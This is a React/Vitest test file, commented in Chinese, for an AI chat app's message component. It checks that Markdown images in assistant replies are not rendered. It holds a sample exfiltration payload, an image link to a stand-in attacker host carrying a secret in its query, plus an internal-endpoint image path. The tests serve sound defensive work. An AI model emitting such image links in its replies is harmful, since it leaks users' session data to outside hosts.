/**
 * #1229 — 助手 Markdown 图片一律不加载：
 * 外链图 URL 可携带会话数据外发，且仓库与部署侧均无 CSP 兜底（R13-R03）。
 */
import { render, screen } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { MessageBubble } from './MessageBubble';
import type { AiChatMessage } from '@/utils/api/types';

function assistantMessage(content: string): AiChatMessage {
  return {
    id: 1,
    session_id: 7,
    role: 'assistant',
    content,
    tool_calls: [],
    tool_call_id: null,
    status: 'completed',
    meta: {},
    created_at: '2026-09-11T00:00:00Z',
  };
}

describe('MessageBubble 图片阻断（#1229）', () => {
  it('外链图片不渲染 <img>（不发出请求），alt 与 URL 以纯文本呈现', () => {
    const { container } = render(
      <MessageBubble
        message={assistantMessage(
          '执行完成 ![截图](https://attacker.example/pixel?d=secret) 请查收',
        )}
      />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.queryByRole('img')).not.toBeInTheDocument();
    expect(screen.getByText(/图片已禁用/)).toBeInTheDocument();
    expect(screen.getByText(/attacker\.example\/pixel/)).toBeInTheDocument();
    // 合法文本展示不受损
    expect(screen.getByText(/执行完成/)).toBeInTheDocument();
    expect(screen.getByText(/请查收/)).toBeInTheDocument();
  });

  it('相对路径图片同样不加载（防内部端点被 GET 触发）', () => {
    const { container } = render(
      <MessageBubble message={assistantMessage('![](/api/v1/plan-runs/1/summary)')} />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText(/图片已禁用/)).toBeInTheDocument();
  });
});
